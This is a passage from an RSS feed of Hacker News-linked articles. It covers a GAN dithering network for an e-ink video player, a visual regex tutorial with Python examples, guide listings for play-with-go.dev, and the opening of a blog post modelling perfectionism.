     for this v1 version using deconvolutions in the decoder
     (instead of nearest neighbour upsampling) actually looked pretty good!
     nicely captured texture for a dither with a surprisingly small network.
 </li>

 <li>
     i actually did some experiments using branches in the decoder for both upsampling
     and deconvolutions but the deconvs always dominated too much. i thought that would
     allow the upsampling to work as a kind of residual to the deconv but it never happened.
 </li>
</ul>
<table>
<tbody><tr><td>
<img src="http://matpalm.com/blog/imgs/2020/dn/v1.deconv.png">
</td></tr>
<tr><td>
v1 vanilla unet with deconvolution example
</td></tr>
</tbody></table>



<p>for v2 i added a GAN objective in an attempt to capture finer details
</p>
<table>
<tbody><tr><td>
<img src="http://matpalm.com/blog/imgs/2020/dn/models.v2.png">
</td></tr>
<tr><td>
v2 architecture
</td></tr>
</tbody></table>

<p>i started with the original
   <a href="https://arxiv.org/abs/1611.07004">pix2pix</a>
   objective but reasonably quickly moved to use a
   <a href="https://arxiv.org/abs/1701.07875">wasserstein</a>
   critic style objective since i've always found it more stable.
</p>
<p>the generator (G) was the same as the unet above with the discriminator (D) running patch based.
   at this point i also changed the reconstruction loss from a binary objective to just L1.
   i ended up using batchnorm in D, but not G.
   to be honest i only did a little did of manual tuning, i'm sure there's a better result
   hidden in the hyperparameters somewhere.
</p>
<p>so, for this version, the loss for G has two components
</p>
<pre>1. D(G(rgb))             # fool D
2. L1(G(rgb), dither)    # reconstruct the dither
</pre>

<p>very quickly (i.e. in &lt; 10mins ) we get a reasonable result that is started to
   show some more detail than just the blobby reconstruction.
</p>
<table>
<tbody><tr><td>
<img src="http://matpalm.com/blog/imgs/2020/dn/v2.eg.png">
</td></tr>
<tr><td>
v2 partial trained eg
</td></tr>
</tbody></table>

<p>note: if the loss weight of 2) is 0 we degenerate to v1
   (which proved a useful intermediate debugging step).
   at this point i didn't want to tune to much since the final v3 is coming...
</p>


<p>for v3 we finally introduce a loss relating the previous frame
   (which was one of the main intentions of the project in the first place)
</p>
<p>now G takes not just the RGB image, but the dither of the previous frame.
</p>
<table>
<tbody><tr><td>
<img src="http://matpalm.com/blog/imgs/2020/dn/models.v3.png">
</td></tr>
<tr><td>
v3 architecture
</td></tr>
</tbody></table>

<p>the loss for G now has three parts
</p>
<pre>1. D(G(rgb_t1)) =&gt; real      # fool D
2. L1(G(rgb_t1), dither_t1)  # reconstruct the dither
3. L1(G(rgb_t1), dither_t0)  # don't change too much from the last frame
</pre>

<p>normally with a network that takes as input the same thing it's outputting
   we have to be careful to include things like teacher forcing.
   but since we don't intend to use this network for any kind of rollouts
   we can just always feed the "true" dithers in where required.
   having said that, rolling out the dithers from this network would be interesting :D
</p>


<p>the third loss objective, not changing too many pixels from the last frame,
   works well for generally stationary shots
   but is disastrous for scene changes :/
</p>
<p>consider the following graph for a sequence of frames showing the pixel difference
   between frames.
</p>
<p><img src="http://matpalm.com/blog/imgs/2020/dn/pixel_diff_between_scenes.png"></p><p>when there is a scene change we observe a clear "spike" in pixel diff. my first thought
   was to look for these and do a full redraw for them. it's very straightforward to
   find them (using a simple z-score based anomaly detector on a sliding window) but
   the problem is that it doesn't pick up the troublesome case of a panning shot where we don't
   have a scene change exactly. in these cases there is no abrupt scene change, but there
   are a lot of pixels changing so we end up seeing a lot of ghosting.
</p>
<p>i spent ages tinkering with the best way to approach this before deciding that a simple
   approach of <code>num_pixels_changed_since_last_redraw &gt; threshold</code> was good enough to decide
   if a full redraw was required (with a cooldown to ensure we not redrawing all the time)
</p>


<p>the v3 network gets a very good result <em>very</em> quickly; unsurprisingly since the dither at time
   t0 provided to G is a pretty good estimate of the dither at t1 :)
   i.e. G can get a good result simply by copying it!
</p>
<p>the following scenario shows this effect...
</p>
<p>consider three sequential frames, the middle one being a scene change.
</p>
<p><img src="http://matpalm.com/blog/imgs/2020/dn/v3.scene_eg.1.png"></p><p>at the very start of training the reconstruction loss is dominant and
   we get blobby outlines of the frame.
</p>
<p><img src="http://matpalm.com/blog/imgs/2020/dn/v3.scene_eg.2.png"></p><p>but as the contribution from the dither at time t0 kicks it things look good in general but
   the frames at the scene change end up being a ghosted mix attempt to copy through the old
   frame along with dithering the new one.
   (depending on the relative strength of the loss terms of G).
</p>
<p><img src="http://matpalm.com/blog/imgs/2020/dn/v3.scene_eg.3.png"></p>
<p>so the v3 version generally works and i'm sure with some more tuning i could get a better result
   but, as luck would have it, i actually find the results from v2 more appealing when testing
   on the actual eink screen. so even though the intention was do something like v3 i'm going to end
   up running something more like v2 (as shown in these couple of examples (though the resolution
   does it no justice (not to mention the fact the player will run about 5000 times slower than these
   gifs)))
</p>




<p>i'll update this section when i get a proper frame made (though i might try myself?) but for now the
   prototype lives balanced precariously on a piece of foam below it's younger sibling pi zero eink screen
   running game of life.
</p>
<table>
<tbody><tr><td><img src="http://matpalm.com/blog/imgs/2020/dn/prototype.png"></td></tr>
<tr><td>prototype on desk</td></tr>
</tbody></table>



<ul>
 <li>
     for reconstruction and frame change i used L1 loss, but that's not exactly what we
     want. since we want to avoid the ghosting (white changing to black resulting in grey)
     we should try to avoid white to black but ignore black to white.
 </li>

 <li>
     we might be able to better handle scene changes by also including a
     loss component around the <em>next</em> frame.
 </li>

 <li>
     there's a padding issue where i train G on patches but when it's run on the full res
     version we get an edge artefact the size of the original patch (see image below).
     as a hacky fix i just padded the RGB image before passing it to …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://matpalm.com/blog/dithernet_vsmp/">http://matpalm.com/blog/dithernet_vsmp/</a></em></p>]]>
            </description>
            <link>http://matpalm.com/blog/dithernet_vsmp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25090215</guid>
            <pubDate>Sat, 14 Nov 2020 04:06:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Visual Guide to Regular Expression]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25090112">thread link</a>) | @gilad
<br/>
November 13, 2020 | https://amitness.com/regex/ | <a href="https://web.archive.org/web/*/https://amitness.com/regex/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="text">
<p>It’s a common task in NLP to either check a text against a pattern or extract parts from the text that matches a certain pattern. A regular expression or “regex” is a powerful tool to achieve this.</p>
<p>While powerful, regex can feel daunting as it comes with a lot of features and sub-parts that you need to remember.</p>
<p>In this post, I will illustrate the various concepts underlying regex. The goal is to help you build a good mental model of how a regex pattern works.</p>
<h2 id="mental-model">Mental Model</h2>
<p>Let’s start with a simple example where we are trying to find the word ‘cool’ in the text.</p>
<p><img src="https://amitness.com/images/regex-mental-model-example.png" alt=""></p>
<p>With regex, we could simply type out the word ‘cool’ as the pattern and it will match the word.</p>

<p>While regex matched our desired word ‘<strong>cool</strong>’, the way it operates is not at the word level but the character level. This is the key idea.</p>
<blockquote>
<p><strong>Key Idea</strong>: Regex works at the character-level, not word-level.</p>
</blockquote>
<p><img src="https://amitness.com/images/regex-working.png" alt=""></p>
<p>The implication of this is that the regex <code>r'cool'</code> would match the following sentences as well.</p>
<p><img src="https://amitness.com/images/regex-exact-word-match.png" alt=""></p>
<h2 id="basic-building-blocks">Basic Building Blocks</h2>
<p>Now that we understand the key idea, let’s understand how we can match simple characters using regex.</p>
<h3 id="a-specific-character">a. Specific character</h3>
<p>We can simply specify the character in the regular expression and it will match all instances in the text.</p>
<p>For example, a regular expression given below will match all instances of ‘a’ in the text. You can use any of the small and capital alphabets.</p>

<p><img src="https://amitness.com/images/regex-match-only-a.png" alt=""></p>
<p>You can also use any digits from 0 to 9 and it will work as well.</p>

<p><img src="https://amitness.com/images/regex-python-3.7-example.png" alt=""></p>
<p>Note that regex is case-sensitive by default and thus the following regex won’t match anything.</p>

<p><img src="https://amitness.com/images/regex-not-matched-by-capital-a.png" alt=""></p>
<h3 id="b-white-space-character">b. White space character</h3>
<p>We can detect special characters such as whitespace and newlines using special escape sequences.</p>
<p><img src="https://amitness.com/images/regex-white-space-characters.png" alt=""></p>
<p>Besides the common ones above, we have:</p>
<ul>
<li><strong>\r</strong> for carriage return</li>
<li><strong>\f</strong> for form feed</li>
<li><strong>\e</strong> for escape.</li>
</ul>
<h3 id="c-special-sequences">c. Special sequences</h3>
<p>Regex provides a bunch of built-in special symbols that can match a group of characters at once. These begin with backslash <code>\</code>.</p>
<h4 id="pattern-d">Pattern: <code>\d</code></h4>
<p>It matches any single-digit number between 0 to 9.</p>
<p><img src="https://amitness.com/images/regex-single-digit.png" alt=""></p>
<p>Notice that matches are single digit. So we have 4 different matches below instead of a single number <code>18.04</code>.</p>
<p><img src="https://amitness.com/images/regex-ubuntu-18.04.png" alt=""></p>
<h4 id="pattern-s">Pattern: \s</h4>
<p>It matches any whitespace character (<span>space</span>, <span>tab</span> or <span>newline</span>).</p>
<p><img src="https://amitness.com/images/regex-match-any-whitespace.png" alt=""></p>
<h4 id="pattern-w">Pattern: \w</h4>
<p>It matches any of the small alphabets(a to z), capital alphabets(A to Z), digits (0 to 9), and underscore.</p>
<p><img src="https://amitness.com/images/regex-slash-w.png" alt=""></p>
<h4 id="pattern-">Pattern: .</h4>
<p>It matches any character except the new line (\n).</p>
<p><img src="https://amitness.com/images/regex-everything-except-newline.png" alt=""></p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>&gt;&gt;&gt;</span> <span>re</span><span>.</span><span>findall</span><span>(</span><span>r'.'</span><span>,</span> <span>'line 1</span><span>\n</span><span>line2'</span><span>)</span>
<span>[</span><span>'l'</span><span>,</span> <span>'i'</span><span>,</span> <span>'n'</span><span>,</span> <span>'e'</span><span>,</span> <span>' '</span><span>,</span> <span>'1'</span><span>,</span> <span>'l'</span><span>,</span> <span>'i'</span><span>,</span> <span>'n'</span><span>,</span> <span>'e'</span><span>,</span> <span>'2'</span><span>]</span>
</code></pre></div></div>
<h4 id="pattern-negations">Pattern: Negations</h4>
<p>If you use the capitalized versions of the patterns above, they act as negation.</p>
<p>For example, if “\d” matched any digits from 0 to 9, then “\D” will match anything except “0 to 9”.</p>
<p><img src="https://amitness.com/images/regex-negation.png" alt=""></p>
<h3 id="d-character-sets">d. Character sets</h3>
<p>These are patterns starting with <code>[</code> and ending with <code>]</code> and specify the characters that should be matched enclosed by brackets.</p>
<p>For example, the following pattern matches any of the characters ‘a’, ‘e’, ‘i’, ‘o’, and ‘u’.
<img src="https://amitness.com/images/regex-aeiou.png" alt=""></p>
<p>You can also replicate the functionality of <code>\d</code> using the below pattern. It will match any digits between 0 to 9.
<img src="https://amitness.com/images/regex-1-to-9.png" alt=""></p>
<p>Instead of specifying all the digits, we can use <code>-</code> to specify only start and end digits. So, instead of <code>[0123456789]</code>, we can do:</p>
<p><img src="https://amitness.com/images/regex-refactor-all-digits.png" alt=""></p>
<p>For example, <code>[2-4]</code> can be used to match any digits between 2 to 4 i.e. (2 or 3 or 4).</p>
<p><img src="https://amitness.com/images/regex-year-2014-example.png" alt=""></p>
<p>You can even use the special characters we learned previously inside the brackets. For example, you can match any digit from 0 to 9 or whitespace as:</p>
<p><img src="https://amitness.com/images/regex-whitespace-or-digit.png" alt=""></p>
<p>Below, I have listed some useful common patterns and what they mean.</p>
<p><img src="https://amitness.com/images/regex-common-pattern-for-bracket.png" alt=""></p>
<h3 id="e-anchors">e. Anchors</h3>
<p>Regex also has special handlers to make the pattern only match if it’s at the start or end of the string.</p>
<p>We can use the <code>^</code> anchor to match patterns only at the start of a line. For example:</p>
<p><img src="https://amitness.com/images/regex-start-anchor.png" alt=""></p>
<p>Similarly, we can use the <code>$</code> anchor after the character to match patterns only if it’s the end of the line. For example:</p>
<p><img src="https://amitness.com/images/regex-anchor-end.png" alt=""></p>
<h3 id="f-escaping-metacharacters">f. Escaping metacharacters</h3>
<p>Consider a case where we want to exactly match the word “Mr. Stark”.</p>
<p>If we write a regex like <code>Mr. Stark</code>, then it will have an unintended effect. Since we know dot has a special meaning in a regex.</p>
<p><img src="https://amitness.com/images/regex-dot-issue.png" alt=""></p>
<p>So, we should always escape the special metacharacters like <code>.</code>, <code>$</code> etc. if our goal is to match the exact character itself.</p>
<p><img src="https://amitness.com/images/regex-dot-fixed.png" alt=""></p>
<p>Here is the list of metacharacters that you should remember to escape if you’re using them directly.</p>
<div><div><pre><code>^ $ . * + ? { } [ ] \ | ( )
</code></pre></div></div>
<h2 id="repetition-of-basic-blocks">Repetition of basic blocks</h2>
<p>Now that we can pattern match any characters, we could repeat things and start building more complicated patterns.</p>
<h3 id="a-naive-repetition">a. Naive repetition</h3>
<p>Using only what we have learned so far, a naive way would be to just repeat the pattern. For example, we can match two-digit numbers by just repeating the character-level pattern.</p>

<p><img src="https://amitness.com/images/regex-slash-d-slash-d.png" alt=""></p>
<h3 id="b-quantifiers">b. Quantifiers</h3>
<p>Regex provides special quantifiers to specify different types of repetition for the character preceding it.</p>
<h4 id="i-fixed-repetition">i. Fixed repetition</h4>
<p>We can use the <code>{...}</code> quantifier to specify the number of times a pattern should repeat.</p>
<p><img src="https://amitness.com/images/regex-manual-counts.png" alt=""></p>
<p>For example, the previous pattern for matching 2-digit number can be recreated as:</p>
<p><img src="https://amitness.com/images/regex-it-is-2020.png" alt=""></p>
<p>You can also specify a range of repetitions using the same quantifier. For example, to match from 2-digit to 4-digit numbers, we could use the pattern:</p>
<p><img src="https://amitness.com/images/regex-min-max-count.png" alt=""></p>
<p>When applied to a sentence, it will match both 4-digit and 2-digit numbers.</p>
<p><img src="https://amitness.com/images/regex-20-years-old.png" alt=""></p>
<div>
<p><strong>Note:</strong></p><p>
There should not be any space between minimum and maximum count For example, \d{2, 4} doesn't work.
</p>
</div>
<h4 id="ii-flexible-quantifiers">ii. Flexible quantifiers</h4>
<p>Regex also provides quantifiers “*”, “+” and “?” using which you can specify flexible repetition of a character.</p>
<ul>
<li>
<p><strong>0 or 1 times</strong>: <code>?</code><br>
The <code>?</code> quantifier matches the previous character if it repeats 0 or 1 times. This can be useful to make certain parts optional. It is equivalent to <code>{0,1}</code>.</p>
<p><img src="https://amitness.com/images/regex-question-mark-clarify.png" alt=""></p>
<p>For example, let’s say we want to match both the word “sound” and “sound” where “s” is optional. Then, we can use the <code>?</code> quantifier that matches if a character repeats 0 or 1 times.<br>
<img src="https://amitness.com/images/regex-question-mark-example.png" alt=""></p>
</li>
<li>
<p><strong>one or more times</strong>: <code>+</code><br>
The <code>+</code> quantifier matches the previous character if it repeats 1 or more times. It is equivalent to <code>{1,}</code>.</p>
<p>For example, we could find numbers of any arbitrary length using the regex <code>\d+</code>.</p>
<p><img src="https://amitness.com/images/regex-example-of-plus.png" alt=""></p>
</li>
<li>
<p><strong>zero or more times</strong>: <code>*</code><br>
The <code>*</code> quantifier matches the previous character if it repeats zero or more times. It is equivalent to <code>{0,}</code>.</p>
</li>
</ul>
<h2 id="usage-in-python">Usage in Python</h2>
<p>Python provides a module called “re” in the standard library to work with regular expression.</p>
<h3 id="need-for-raw-strings">Need for raw strings</h3>
<p>To specify a regular expression in Python, we precede it with <strong>r</strong> to create raw strings.</p>

<p>To understand why we precede with <strong>r</strong>, let’s try printing the expression <strong>\t</strong> without <code>**r**</code>.</p>
<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>pattern</span> <span>=</span> <span>'</span><span>\t</span><span>'</span>
<span>&gt;&gt;&gt;</span> <span>print</span><span>(</span><span>pattern</span><span>)</span>

</code></pre></div></div>
<p>You can see how when we don’t use raw string, the string <code>\t</code> is treated as the escape character for tab by Python.</p>
<p>Now let’s convert it into raw string. We get back whatever we specified.</p>
<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>pattern</span> <span>=</span> <span>r'\t'</span>
<span>&gt;&gt;&gt;</span> <span>print</span><span>(</span><span>pattern</span><span>)</span>
\<span>t</span>
</code></pre></div></div>
<h3 id="using-re-module">Using re module</h3>
<p>To use <code>re</code> module, we can start by importing the <code>re</code> module as:</p>

<h4 id="1-refindall">1. re.findall</h4>
<p>This function allows us to get all the matches as a list of strings.</p>
<div><div><pre><code><span>import</span> <span>re</span>
<span>re</span><span>.</span><span>findall</span><span>(</span><span>r'\d'</span><span>,</span> <span>'123456'</span><span>)</span>
</code></pre></div></div>
<div><div><pre><code>['1', '2', '3', '4', '5', '6']
</code></pre></div></div>
<h4 id="2-rematch">2. re.match</h4>
<p>This function searches for a pattern at the beginning of the string and returns the first occurrence as a match object. If the pattern is not found, it returns None.</p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>match</span> <span>=</span> <span>re</span><span>.</span><span>match</span><span>(</span><span>r'batman'</span><span>,</span> <span>'batman is cool'</span><span>)</span>
<span>print</span><span>(</span><span>match</span><span>)</span>
</code></pre></div></div>
<div><div><pre><code>&lt;re.Match object; span=(0, 6), match='batman'&gt;
</code></pre></div></div>
<p><img src="https://amitness.com/images/regex-match-object.png" alt=""></p>
<p>With the match object, we can get the matched text as</p>


<p>In a case where our pattern is not at the start of the sentence, we will not get any match.</p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>match</span> <span>=</span> <span>re</span><span>.</span><span>match</span><span>(</span><span>r'batman'</span><span>,</span> <span>'The batman is cool'</span><span>)</span>
<span>print</span><span>(</span><span>match</span><span>)</span>
</code></pre></div></div>

<h4 id="3-research">3. re.search</h4>
<p>This function also finds the first occurrence of a pattern but the pattern can occur anywhere in the text. If the pattern is not found, it returns None.</p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>match</span> <span>=</span> <span>re</span><span>.</span><span>search</span><span>(</span><span>r'batman'</span><span>,</span> <span>'the batman is cool'</span><span>)</span>
<span>print</span><span>(</span><span>match</span><span>.</span><span>group</span><span>())</span>
</code></pre></div></div>

<h2 id="references">References</h2>
<ul>
<li>A.M. Kuchling, <a href="https://docs.python.org/3/howto/regex.html">“Regular Expression HOWTO - Python 3.9.0 documentation”</a></li>
</ul>
</section></div>]]>
            </description>
            <link>https://amitness.com/regex/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25090112</guid>
            <pubDate>Sat, 14 Nov 2020 03:37:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tracking Hacker News sentiment towards Big Tech companies]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25088966">thread link</a>) | @greatwave1
<br/>
November 13, 2020 | https://www.quiverquant.com/sources/hackernews | <a href="https://web.archive.org/web/*/https://www.quiverquant.com/sources/hackernews">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<p><a href="https://www.quiverquant.com/">
						<img src="https://www.quiverquant.com/static/img/logo.png" alt="">
					</a></p><p>Quiver scrapes alternative stock data from across the internet and aggregates it in a free, easy-to-use web dashboard.</p>
					<div>
						<p><span>Copyright © 2020 Quiver Quantitative, Inc. All rights reserved.</span></p><ul>
							<li><a href="https://www.quiverquant.com/privacypolicy">Privacy Policy</a></li>
							<li><a href="https://www.quiverquant.com/termsofservice">Terms of Service</a></li>
						</ul>
					</div>
				</div></div>]]>
            </description>
            <link>https://www.quiverquant.com/sources/hackernews</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088966</guid>
            <pubDate>Fri, 13 Nov 2020 23:55:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Play with Go]]>
            </title>
            <description>
<![CDATA[
Score 118 | Comments 13 (<a href="https://news.ycombinator.com/item?id=25088913">thread link</a>) | @philosopher1234
<br/>
November 13, 2020 | https://play-with-go.dev/guides.html | <a href="https://web.archive.org/web/*/https://play-with-go.dev/guides.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    <div>
      <div>
        
        <p>
          A series of hands-on, interactive, browser-based guides that introduce the tools required to work with the Go programming language.
      </p></div>
      <div>
        <p><img src="https://play-with-go.dev/images/gopher.png">
        </p>
      </div>
    </div>


    

    
    

    <div>
      
      <div>
        <div>
          <div>
            <h5>An introduction to play-with-go.dev guides</h5>
            <p>Learn about how to get the most out of play-with-go.dev guides</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>Get started with Go</h5>
            <p>You've completed the Go tour, so what next? This guide gives a brief introduction to Go programming</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>Go fundamentals</h5>
            <p>Primer on creating and using go modules</p>
            
            

          </div>
          
        </div>
      </div>
      
    </div>
    
    

    <div>
      
      <div>
        <div>
          <div>
            <h5>Working with private modules</h5>
            <p>How to create, publish and work with non-public modules in your team.</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>How to use and tweak Staticcheck</h5>
            <p>Using static analysis to automatically find bugs and performance optimizations.</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>Developer tools as module dependencies</h5>
            <p>Ensure all developers use the same version of each developer tool</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>Installing Go</h5>
            <p>Ready to take the plunge and install Go on your system?!</p>
            
            

          </div>
          
        </div>
      </div>
      
    </div>
    
    

    <div>
      
      <div>
        <div>
          <div>
            <h5>Installing Go programs directly</h5>
            <p>Simple easy-to-remember way to install Go programs</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>Retract Module Versions</h5>
            <p>Learn how to flag modules that shouldn't be used</p>
            
            

          </div>
          
        </div>
      </div>
      
    </div>
    
  </div>
  </div></div>]]>
            </description>
            <link>https://play-with-go.dev/guides.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088913</guid>
            <pubDate>Fri, 13 Nov 2020 23:45:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Pretty Good Mathematical Model of Perfectionism]]>
            </title>
            <description>
<![CDATA[
Score 165 | Comments 32 (<a href="https://news.ycombinator.com/item?id=25088396">thread link</a>) | @freefrancisco
<br/>
November 13, 2020 | https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/ | <a href="https://web.archive.org/web/*/https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

					

					

					<p>I struggle with perfectionism. Well, not so much “struggle with” — I’m f*cking great at it. It comes naturally.</p>
<p>There are some upsides, but perfectionism is also associated with anxiety, depression, procrastination, and damaged relationships. Perhaps you, like I, have spent far too much time and emotional energy making sure that an email had the right word choice, had no typos, didn’t reuse a phrase in successive sentences/paragraphs, and closed with the ‘correct’ sign-off. (‘Best,’ is almost always optimal, by the way).</p>
<blockquote><p>“If I couldn’t do something that rated 10 out of 10 — or at least close to that — I didn’t want to do it at all. Being a perfectionist was an ongoing source of suffering and unhappiness for me … Unfortunately, many of us have been conditioned to hold ourselves to impossible standards. This is a stressful mind state to live in, that’s for sure.” ~ <a href="https://www.psychologytoday.com/us/blog/turning-straw-gold/201806/how-overcome-your-perfectionist-tendencies" target="_blank" rel="noopener">Tony Bernard J.D.</a></p></blockquote>
<p>The topic of perfectionism confused me for years. Of course you want things to be perfect; why would you ever actively want something to be worse? However, there’s way more to it than that: It’s a complex interplay between effort, time, motivation, and expectations.</p>
<p>Far too many self-help recommendations essentially said “Be ok with mediocrity!” which… did not speak to me, to say the least.</p>
<p>To better understand the concept, I went through a number of books and papers before building a quasi-mathematical model. You know, like ya’do.</p>
<p>I’ve come to see perfectionism as a mindset with a particular calibration between the quality of your work and your emotional reaction — with decreased sensitivity to marginal differences in lower-quality work and increasing sensitivity as the quality goes up.</p>
<p><img data-attachment-id="2370" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/graphs/" data-orig-file="https://i1.wp.com/jessegalef.com/wp-content/uploads/2020/08/graphs.png?fit=1080%2C560&amp;ssl=1" data-orig-size="1080,560" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="graphs" data-image-description="" data-medium-file="https://i1.wp.com/jessegalef.com/wp-content/uploads/2020/08/graphs.png?fit=300%2C156&amp;ssl=1" data-large-file="https://i1.wp.com/jessegalef.com/wp-content/uploads/2020/08/graphs.png?fit=630%2C327&amp;ssl=1" loading="lazy" src="https://i1.wp.com/jessegalef.com/wp-content/uploads/2020/08/graphs.png?resize=630%2C327&amp;ssl=1" alt="graphs" width="630" height="327" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/jessegalef.com/wp-content/uploads/2020/08/graphs.png?resize=630%2C327&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<ul>
<li><span><strong>In a “Balanced” mindset,</strong> </span>you become happier in linear proportion to how much better your work is going. (y = x)</li>
<li><span><strong>In a “Satisficing” mindset</strong></span> — taking a pass/fail test, for example — you care about whether something is “good enough”. Most of your emotional variance comes as you approach and meet that threshold.&nbsp; ( e^x / (1+e^x) )</li>
<li><span><strong>In a Perfectionist mindset,</strong></span> the relationship between quality and emotion is polynomial. You feel almost equally bad about scoring a 40% on a test vs. a 65%, but the difference between a 90% and 93% looms large. (y = x^7)</li>
</ul>
<p>Looking at the model, I realized it could explain a number of experiences I’d had.</p>
<hr>
<h3>Why even small tasks seem daunting to a perfectionist</h3>
<p>A common experience with a perfectionist mindset is having trouble ‘letting go’ of a project — we want to keep tinkering with it, improving it, and never feel quite comfortable moving on. &nbsp;(I don’t want to say how long this draft sat around.)</p>
<p>This make sense given the model:</p>
<p><img data-attachment-id="2369" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/happyenough/" data-orig-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?fit=1200%2C702&amp;ssl=1" data-orig-size="1200,702" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="HappyEnough" data-image-description="" data-medium-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?fit=300%2C176&amp;ssl=1" data-large-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?fit=630%2C369&amp;ssl=1" loading="lazy" src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?resize=630%2C369&amp;ssl=1" alt="HappyEnough" width="630" height="369" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?resize=630%2C369&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>When I think about clicking ‘send’ or ‘post’ before I’ve checked for typos, before I’ve reread everything, before considering where it might be wrong or unclear… it just feels, well, WRONG. I’m not yet happy with it and have trouble declaring it done.</p>
<p>Apart from requiring more time and effort, this can make even seemingly trivial tasks feel daunting. Internally, if you know that a short email will take an hour and a half it’s going to loom large even if you have trouble explaining quite why such a small thing is making you feel overwhelmed.</p>
<hr>
<p><strong>What’s helped me:</strong> A likely culprit is overestimating the consequences of mistakes. One solution is to be concrete and write down what you expect to happen if it turns out you have a typo, miss a shot, or bomb a test. Sometimes all it takes to readjust is examining those expectations consciously. Other times you’ll need to experience the ‘failure’, at which point you can compare it to your stated expectations.</p>
<hr>
<h3>Why perfectionists give up on hobbies and tasks easily</h3>
<p>Another way to look at this is: if you don’t expect to reach high standards, a project just doesn’t seem worth doing.</p>
<p><img data-attachment-id="2368" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/adequateresults/" data-orig-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?fit=1266%2C744&amp;ssl=1" data-orig-size="1266,744" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="AdequateResults" data-image-description="" data-medium-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?fit=300%2C176&amp;ssl=1" data-large-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?fit=630%2C370&amp;ssl=1" loading="lazy" src="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?resize=630%2C370&amp;ssl=1" alt="AdequateResults" width="630" height="370" data-recalc-dims="1" 